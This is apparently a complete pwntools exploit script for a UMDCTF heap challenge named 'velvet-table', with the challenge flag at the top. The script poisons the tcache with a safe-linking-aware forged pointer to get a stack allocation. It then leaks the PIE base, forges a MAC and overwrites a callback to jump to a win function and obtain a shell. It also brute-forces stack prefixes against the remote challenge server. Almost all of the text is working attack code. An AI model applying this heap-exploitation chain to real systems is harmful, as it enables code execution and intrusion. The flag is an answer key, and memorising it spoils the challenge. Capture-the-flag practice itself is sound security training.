# UMDCTF{smallbins_still_love_the_stack_when_the_house_sets_the_table}

#!/usr/bin/env python3
from pwn import *
import os
import re

PORT =  30304
HOST = "challs.umdctf.io"

e = context.binary = ELF('./velvet-table', checksec=False)
context.log_level = 'debug'

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            set follow-fork-mode parent
            b *$rebase(0x1b60)
            c
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        env = dict(os.environ)
        env.pop("LD_PRELOAD", None)
        return e.process(env=env)

def rol32(x, r):
    x &= 0xffffffff
    r &= 31
    if r == 0:
        return x
    return ((x << r) & 0xffffffff) | (x >> (32 - r))

def enc_key(seed, real_idx, i):
    base = ((real_idx * 0x45d9f3b) & 0xffffffff) ^ seed
    v = rol32((base ^ ((i * 0x9e37) & 0xffffffff)) & 0xffffffff,
              (real_idx + i) & 7)
    return v & 0xff

def decrypt_inspect(raw, seed, real_idx):
    return bytes(raw[i] ^ enc_key(seed, real_idx, i) for i in range(len(raw)))

def find_local_stack_prefix(proc, low36):
    maps_path = f"/proc/{proc.pid}/maps"

    with open(maps_path, "r") as f:
        for line in f:
            if "[stack]" not in line:
                continue

            lo_s, hi_s = line.split()[0].split("-")
            lo = int(lo_s, 16)
            hi = int(hi_s, 16)

            for prefix in range(lo >> 36, (hi >> 36) + 1):
                cand = (prefix << 36) | low36
                if lo <= cand < hi:
                    return prefix

    # fallback cho Linux thông thường
    return 0x7ff

def exploit(stack_prefix=None):
    global p

    p = conn()

    # GDB()

    banner = p.recvuntil(b'> ')

    m = re.search(rb'table marker: 0x([0-9a-fA-F]+)', banner)
    if not m:
        p.close()
        return None

    marker = int(m.group(1), 16)

    # marker = ((stack_note >> 4) & 0xffffffff) ^ 0x9ac90307
    stack_key = marker ^ 0x9ac90307
    stack_key &= 0xffffffff

    seed = stack_key ^ 0x5a17c3d9
    seed &= 0xffffffff

    seat_mask = (stack_key ^ 0x7e) & 0xf
    low36 = stack_key << 4

    if stack_prefix is None:
        if args.REMOTE:
            stack_prefix = 0x7ff
        else:
            stack_prefix = find_local_stack_prefix(p, low36)

    stack_note = (stack_prefix << 36) | low36

    log.info(f"marker      = {hex(marker)}")
    log.info(f"seed        = {hex(seed)}")
    log.info(f"seat_mask   = {hex(seat_mask)}")
    log.info(f"stack_note  = {hex(stack_note)}")

    def user_seat(real_idx):
        return (((real_idx - 3) & 0xf) ^ seat_mask)

    def menu(x):
        p.sendline(str(x).encode())

    def reserve(real_idx, size):
        menu(1)
        p.sendlineafter(b'seat: ', str(user_seat(real_idx)).encode())
        p.sendlineafter(b'size: ', str(size).encode())

        out = p.recvuntil(b'> ')
        mm = re.search(rb'reservation confirmed: (0x[0-9a-fA-F]+)', out)
        if not mm:
            raise EOFError("reserve failed")

        ptr = int(mm.group(1), 16)
        log.info(f"reserve real_idx={real_idx} size={hex(size)} -> {hex(ptr)}")
        return ptr

    def cashout(real_idx):
        menu(2)
        p.sendlineafter(b'seat: ', str(user_seat(real_idx)).encode())
        return p.recvuntil(b'> ')

    def update(real_idx, data):
        menu(3)
        p.sendlineafter(b'seat: ', str(user_seat(real_idx)).encode())
        p.sendlineafter(b'length: ', str(len(data)).encode())
        p.recvuntil(b'data:\n')
        p.send(data)
        return p.recvuntil(b'> ')

    def inspect(real_idx, n=64):
        menu(4)
        p.sendlineafter(b'seat: ', str(user_seat(real_idx)).encode())

        raw = p.recvn(n)
        p.recvuntil(b'> ')

        dec = decrypt_inspect(raw, seed, real_idx)
        return dec

    def settle():
        menu(7)
        return p.recvuntil(b'> ')

    def payout():
        menu(6)

    # Need exactly two chunks in the 0x110 tcache bin.
    # Extra 0x120 chunk is only to increase internal state enough for settle-ledger.
    a = reserve(0, 0x110)
    b = reserve(1, 0x110)
    filler = reserve(5, 0x120)

    cashout(0)
    cashout(1)
    cashout(5)

    # Enables full memcpy in update().
    settle()

    # Tcache list for 0x110 bin:
    #   b -> a
    #
    # Poison b->next = stack_note.
    poisoned_fd = stack_note ^ (b >> 12)
    log.info(f"poisoned_fd = {hex(poisoned_fd)}")

    update(1, p64(poisoned_fd))

    # First malloc returns b.
    reserve(3, 0x110)

    # Second malloc returns stack_note.
    got_stack = reserve(4, 0x110)

    if got_stack != stack_note:
        raise EOFError(f"wrong stack target: got {hex(got_stack)}, want {hex(stack_note)}")

    leak = inspect(4, 64)

    reject_cb = u64(leak[0x20:0x28])
    pie_base = reject_cb - 0x1b50
    win = pie_base + 0x1b60

    log.success(f"reject_cb = {hex(reject_cb)}")
    log.success(f"PIE base  = {hex(pie_base)}")
    log.success(f"win       = {hex(win)}")

    mac_const = 0x686f7573655f6564
    new_mac = ((seed & 0xffffffff) << 32) ^ win ^ mac_const

    payload = flat(
        b'A' * 0x20,
        p64(win),
        p64(new_mac)
    )

    update(4, payload)

    payout()

    # Check shell.
    p.sendline(b'echo PWNED')
    try:
        p.recvuntil(b'PWNED', timeout=1)
    except Exception:
        raise EOFError("shell check failed")

    return p

p = None

if args.REMOTE and not args.STACKHI:
    # Remote stack high 12 bits may differ.
    # Brute force common canonical userland prefixes.
    for hi in range(0x7ff, 0x6ff, -1):
        log.info(f"trying stack prefix {hex(hi)}")
        try:
            p = exploit(hi)
            if p:
                log.success(f"worked with stack prefix {hex(hi)}")
                break
        except Exception as ex:
            log.warning(f"prefix {hex(hi)} failed: {ex}")
            try:
                p.close()
            except Exception:
                pass
    else:
        log.failure("all stack prefixes failed")
        exit(1)
else:
    hi = int(args.STACKHI, 0) if args.STACKHI else None
    p = exploit(hi)

p.interactive()